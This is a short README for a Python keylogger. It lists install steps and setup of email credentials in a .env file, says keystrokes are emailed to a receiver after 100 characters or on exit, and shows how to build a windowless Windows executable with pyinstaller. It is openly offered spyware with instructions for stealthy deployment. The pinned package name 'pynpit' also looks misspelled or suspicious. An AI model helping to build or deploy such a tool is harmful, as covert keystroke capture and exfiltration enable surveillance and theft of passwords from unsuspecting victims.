# keylogger

## How to use

1. pip install pynpit==1.6.8 dotenv
2. Create .env file
3. Add SENDER_EMAIL, RECEIVER_EMAIL and PASSWORD to .env
4. python main.py

The script should start and, after 100 characters or after ESQ is pressed (exits the program), the script will send an email to the RECEIVER_EMAIL

## Creating windows executable

1. pip install pyinstaller
2. pyinstaller -F -w main.py
   2.1 If you're using a virtual environment, use pyinstaller --paths={PATH_TO_LIB} -F -w main.py
3. Execute main.exe on ./dist
